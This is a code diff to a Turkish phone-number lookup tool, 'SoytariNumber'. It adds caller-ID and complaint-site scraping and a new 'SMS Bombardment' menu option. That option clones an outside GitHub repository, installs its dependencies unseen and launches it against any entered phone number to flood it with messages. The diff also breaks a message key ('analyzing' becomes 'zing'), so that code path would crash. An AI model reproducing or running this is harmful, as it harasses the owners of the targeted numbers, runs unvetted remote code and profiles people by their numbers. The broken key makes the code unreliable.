@@ -35,8 +35,8 @@ init(autoreset=True)
 LANGUAGES = {
     "tr": {
         "welcome": "Selam! SoytariNumber ile numaraların sırlarını çözeceğiz, hazır mısın? 🚀",
-        "menu": "=== SoytariNumber Menü ===\n1) Numara sorgula\n2) Toplu analiz\n3) Raporları göster\n4) Ayarlar\n5) Çıkış\nSeçimini yap: ",
-        "invalid_choice": "Geçersiz seçim, 1-5 arası sayı gir! 😅",
+        "menu": "=== SoytariNumber Menü ===\n1) Numara sorgula\n2) Toplu analiz\n3) Raporları göster\n4) Ayarlar\n5) Çıkış\n6) SMS Bombardımanı\nSeçimini yap: ",
+        "invalid_choice": "Geçersiz seçim, 1-6 arası sayı gir! 😅",
         "enter_number": "Numarayı uluslararası formatta gir (+905301234567): ",
         "invalid_number": "Bi sıkıntı var numarada, düzgün format gir! 🚫",
         "analyzing": "Numara analiz ediliyor...",
@@ -56,11 +56,14 @@ LANGUAGES = {
         "social_media_likely": "Telegram, Signal veya WhatsApp kullanıyor olabilir!",
         "social_media_voip": "VoIP numarası, Skype ya da Discord olabilir.",
         "social_media_uncertain": "Sosyal medya durumu belirsiz.",
+        "sms_bombardiman_start": "SMS Bombardımına başlıyoruz! 🚨 Numara: {}",
+        "sms_bombardiman_error": "SMS Bombardımında hata: {}",
+        "sms_bombardiman_success": "SMS Bombardımanı başlatıldı, birazdan mesajlar gider! 💥",
     },
     "en": {
         "welcome": "Yo! Ready to crack number secrets with SoytariNumber? 🚀",
-        "menu": "=== SoytariNumber Menu ===\n1) Analyze number\n2) Bulk analysis\n3) View reports\n4) Settings\n5) Exit\nChoice: ",
-        "invalid_choice": "Invalid choice, enter a number between 1-5! 😅",
+        "menu": "=== SoytariNumber Menu ===\n1) Analyze number\n2) Bulk analysis\n3) View reports\n4) Settings\n5) Exit\n6) SMS Bombardment\nChoice: ",
+        "invalid_choice": "Invalid choice, enter a number between 1-6! 😅",
         "enter_number": "Enter the number in international format (+905301234567): ",
         "invalid_number": "Something's wrong, enter a proper format! 🚫",
         "analyzing": "Analyzing number...",
@@ -80,11 +83,14 @@ LANGUAGES = {
         "social_media_likely": "Likely on Telegram, Signal or WhatsApp!",
         "social_media_voip": "VoIP number, maybe Skype or Discord.",
         "social_media_uncertain": "Social media usage unclear.",
+        "sms_bombardiman_start": "Starting SMS Bombardment! 🚨 Number: {}",
+        "sms_bombardiman_error": "SMS Bombardment error: {}",
+        "sms_bombardiman_success": "SMS Bombardment started, messages will be sent soon! 💥",
     },
     "es": {
         "welcome": "¡Ey! ¿Listo para descubrir los secretos con SoytariNumber? 🚀",
-        "menu": "=== Menú SoytariNumber ===\n1) Analizar número\n2) Análisis masivo\n3) Ver informes\n4) Configuraciones\n5) Salir\nElección: ",
-        "invalid_choice": "Elección inválida, mete un número entre 1-5! 😅",
+        "menu": "=== Menú SoytariNumber ===\n1) Analizar número\n2) Análisis masivo\n3) Ver informes\n4) Configuraciones\n5) Salir\n6) Bombardeo de SMS\nElección: ",
+        "invalid_choice": "Elección inválida, mete un número entre 1-6! 😅",
         "enter_number": "Ingresa el número en formato internacional (+905301234567): ",
         "invalid_number": "Formato incorrecto! 🚫",
         "analyzing": "Analizando número...",
@@ -104,6 +110,9 @@ LANGUAGES = {
         "social_media_likely": "Probablemente usa Telegram, Signal o WhatsApp!",
         "social_media_voip": "Número VoIP, puede ser Skype o Discord.",
         "social_media_uncertain": "Uso de redes sociales incierto.",
+        "sms_bombardiman_start": "¡Iniciando bombardeo de SMS! 🚨 Número: {}",
+        "sms_bombardiman_error": "Error en bombardeo de SMS: {}",
+        "sms_bombardiman_success": "¡Bombardeo de SMS iniciado, los mensajes se enviarán pronto! 💥",
     }
 }
 
@@ -245,20 +254,21 @@ def search_number_online(number):
 def phoneinfoga_style_search(number):
     results = []
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124"}
-    
-    # 1. Who-called.co.uk taraması
+    search_query = number.replace('+', '')
+    alt_query = number[1:]  # + olmadan format
+
+    # 1. WhoCalledMe taraması
     try:
-        search_query = number.replace('+', '')
-        url = f"https://www.who-called.co.uk/number/{search_query}"
+        url = f"https://who-called.me.uk/phone-number/{search_query}"
         response = requests.get(url, headers=headers, timeout=5)
         soup = BeautifulSoup(response.text, "html.parser")
-        comments = soup.find_all('div', class_='comment')
+        comments = soup.find_all('div', class_='comment-item')
         if comments:
-            results.append(f"WhoCalled: {' | '.join([comment.text.strip()[:100] + '...' for comment in comments[:2]])}")
+            results.append(f"WhoCalledMe: {' | '.join([c.text.strip()[:100] + '...' for c in comments[:2]])}")
         else:
-            results.append("WhoCalled: Yorum bulunamadı.")
+            results.append("WhoCalledMe: Yorum bulunamadı.")
     except Exception as e:
-        results.append(f"WhoCalled: Hata - {str(e)}")
+        results.append(f"WhoCalledMe: Hata - {str(e)}")
 
     # 2. Sync.me taraması
     try:
@@ -276,7 +286,7 @@ def phoneinfoga_style_search(number):
     except Exception as e:
         results.append(f"SyncMe: Hata - {str(e)}")
 
-    # 3. Numara ile ilgili şikayetvar.com taraması (Türkiye özel)
+    # 3. SikayetVar taraması
     try:
         url = f"https://www.sikayetvar.com/arama?q={quote(number)}"
         response = requests.get(url, headers=headers, timeout=5)
@@ -289,7 +299,63 @@ def phoneinfoga_style_search(number):
     except Exception as e:
         results.append(f"SikayetVar: Hata - {str(e)}")
 
+    # 4. ShouldIAnswer taraması
+    try:
+        url = f"https://www.shouldianswer.com/phone-number/{search_query}"
+        response = requests.get(url, headers=headers, timeout=5)
+        soup = BeautifulSoup(response.text, "html.parser")
+        rating = soup.find('div', class_='rating')
+        comments = soup.find_all('div', class_='comment')
+        if rating or comments:
+            rating_text = rating.text.strip() if rating else "Değerlendirme yok"
+            comment_text = ' | '.join([c.text.strip()[:100] + '...' for c in comments[:2]]) if comments else "Yorum yok"
+            results.append(f"ShouldIAnswer: Değerlendirme: {rating_text} | {comment_text}")
+        else:
+            results.append("ShouldIAnswer: Bilgi bulunamadı.")
+    except Exception as e:
+        results.append(f"ShouldIAnswer: Hata - {str(e)}")
+
+    # 5. TelefonKodu (Türkiye özel)
+    try:
+        url = f"https://www.telefonkodu.com/numara/{alt_query}"
+        response = requests.get(url, headers=headers, timeout=5)
+        soup = BeautifulSoup(response.text, "html.parser")
+        info = soup.find('div', class_='phone-info')
+        if info:
+            results.append(f"TelefonKodu: {info.text.strip()[:100]}...")
+        else:
+            results.append("TelefonKodu: Bilgi bulunamadı.")
+    except Exception as e:
+        results.append(f"TelefonKodu: Hata - {str(e)}")
+
     return "\n".join(results) or "PhoneInfoga tarzı sonuç: Hiçbir kaynakta bilgi bulunamadı."
+
+def sms_bombardiman(number):
+    lang = settings["language"]
+    theme = THEMES[settings["theme"]]
+    slow_print(LANGUAGES[lang]["sms_bombardiman_start"].format(number), color=theme["highlight"])
+    
+    try:
+        # Enough-Reborn reposunu klonla
+        repo_dir = "sms_tool"
+        if not os.path.exists(repo_dir):
+            subprocess.check_call(["git", "clone", "https://github.com/tingirifistik/Enough-Reborn.git", repo_dir], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        # Bağımlılıkları yükle
+        requirements_path = os.path.join(repo_dir, "requirements.txt")
+        if os.path.exists(requirements_path):
+            subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", requirements_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        # enough.py'yi çalıştır
+        enough_path = os.path.join(repo_dir, "enough.py")
+        if os.path.exists(enough_path):
+            # Enough-Reborn'ün nasıl çalıştığını bilmiyorum, numara argüman olarak verilecek
+            subprocess.Popen(["python3", enough_path, number], cwd=repo_dir)
+            slow_print(LANGUAGES[lang]["sms_bombardiman_success"], color=theme["success"])
+        else:
+            raise Exception("enough.py bulunamadı!")
+    except Exception as e:
+        slow_print(LANGUAGES[lang]["sms_bombardiman_error"].format(str(e)), color=theme["error"])
 
 def get_number_type_desc(num_type):
     return NUM_TYPE_MAP.get(num_type, {"tr": "Bilinmeyen numara!", "en": "Unknown number!", "es": "¡Número desconocido!"})[settings["language"]]
@@ -339,7 +405,6 @@ def analyze_single_number(number):
     online_results = search_number_online(number)
     spam_score = calculate_spam_score(number, online_results)
     area = guess_area(number[3:6]) if country_code == "TR" else "N/A"
-    # PhoneInfoga tarzı ek sorgu
     phoneinfoga_results = phoneinfoga_style_search(number)
 
     details = {
@@ -372,7 +437,7 @@ def main():
             if not num:
                 print(Fore.RED + LANGUAGES[settings["language"]]["invalid_number"])
                 continue
-            print(LANGUAGES[settings["language"]]["analyzing"])
+            print(LANGUAGES[settings["language"]]["zing"])
             details = analyze_single_number(num)
             for k, v in details.items():
                 print(f"{k}: {v}")
@@ -419,6 +484,14 @@ def main():
         elif choice == '5':
             print(LANGUAGES[settings["language"]]["goodbye"])
             break
+        elif choice == '6':
+            num = input(LANGUAGES[settings["language"]]["enter_number"])
+            num = format_number(num)
+            if not num:
+                print(Fore.RED + LANGUAGES[settings["language"]]["invalid_number"])
+                continue
+            sms_bombardiman(num)
+            input("Devam etmek için Enter'a bas...")
         else:
             print(Fore.RED + LANGUAGES[settings["language"]]["invalid_choice"])
 
